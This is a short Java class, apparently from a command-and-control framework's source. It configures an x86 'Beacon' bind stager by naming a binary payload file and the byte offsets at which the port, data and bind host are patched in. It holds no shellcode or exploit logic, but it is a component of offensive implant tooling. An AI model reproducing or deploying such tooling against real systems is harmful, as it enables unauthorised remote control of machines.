package stagers;

import common.ScListener;

public class BeaconBindStagerX86 extends GenericBindStager {
  public BeaconBindStagerX86(ScListener scListener) { super(scListener); }
  
  public String arch() { return "x86"; }
  
  public String getFile() { return "resources/bind.bin"; }
  
  public int getPortOffset() { return 204; }
  
  public int getDataOffset() { return 326; }
  
  public int getBindHostOffset() { return 197; }
}
